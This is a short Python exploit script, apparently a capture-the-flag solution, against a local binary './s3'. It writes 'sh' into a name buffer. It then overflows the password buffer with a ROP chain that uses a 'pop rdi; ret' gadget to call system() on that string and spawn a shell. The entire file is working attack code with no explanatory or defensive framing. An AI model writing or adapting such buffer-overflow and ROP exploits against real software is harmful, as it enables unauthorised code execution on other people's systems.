#!/usr/bin/env python

import binexpect
import struct

if __name__ == "__main__":

    setup = binexpect.setup('./s3')
    target = setup.target()
    target.setecho(False)

    stage1 = b'sh'.ljust(8, b'\x00')
    target.tryexpect('What is your name?')
    target.sendbinline(stage1)
    
    payload = b'A' * 0x30
    payload += b'paddingp' #rbp
    payload += struct.pack('L', 0x4007e3) # pop rdi; ret
    payload += struct.pack('L', 0x6010a0) # pop'd
    payload += struct.pack('L', 0x400772) # system()

    target.tryexpect('What is your password?')
    target.sendbinline(payload)

    target.tryexpect("If you're cool you'll get a shell.")
    target.pwned()

